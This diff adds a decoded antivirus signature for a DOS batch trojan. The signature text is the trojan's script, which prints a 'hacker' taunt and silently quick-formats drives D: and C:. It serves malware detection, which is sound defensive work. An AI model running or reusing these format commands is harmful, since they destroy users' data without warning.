@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36639
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off echo my name is "quick_code".see you later!^-^ echo hacker by chinese! format/q/autotest/u d:>nul format/q/autotest/u c:>nul 
